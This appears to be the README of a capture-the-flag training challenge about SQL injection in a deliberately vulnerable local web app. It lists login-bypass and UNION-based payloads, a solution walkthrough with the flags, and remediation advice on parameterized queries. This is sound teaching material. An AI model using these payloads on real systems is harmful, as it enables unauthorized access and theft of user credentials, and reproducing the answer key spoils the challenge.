# Challenge 1: Web Application SQL Injection

## Quick Start

1. **Install Dependencies:**
cd challenge-01-web-sqli
pip install -r requirements.txt

text

2. **Run the Application:**

cd source-code
python vulnerable_app.py


3. **Access the Application:**
Open browser to: http://localhost:5000

## Challenge Objectives

### Primary Flags:
- `CTF{basic_sqli_discovered}` - Basic SQL injection
- `CTF{sql_injection_master_2025}` - Admin access via SQL injection

### Techniques to Practice:

#### 1. Basic SQL Injection (Login Form):
- Try: `admin' --`
- Try: `' OR '1'='1' --`
- Try: `' UNION SELECT 1,2,3,4 --`

#### 2. Union-Based SQL Injection:
' AND (SELECT COUNT(*) FROM users) > 0 --

#### 4. Search Function Injection:
- URL: `/search?q=laptop' UNION SELECT username, password, role FROM users --`

## Solution Walkthrough

### Step 1: Basic Authentication Bypass
1. Navigate to login form
2. Username: `admin' --`
3. Password: `anything`
4. This bypasses password check

### Step 2: Extract User Data
1. Use UNION injection: `' UNION SELECT 1, username, role, flag FROM users --`
2. Reveals all user data including flags

### Step 3: Database Enumeration
1. Extract table names: `' UNION SELECT 1, name, 2, 3 FROM sqlite_master WHERE type='table' --`
2. Extract column names: `' UNION SELECT 1, sql, 2, 3 FROM sqlite_master --`

## Remediation

### Secure Code Example:
Use parameterized queries

cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password_hash))

text

### Security Best Practices:
- Input validation and sanitization
- Parameterized queries
- Least privilege database access
- Web Application Firewall (WAF)
- Regular security testing
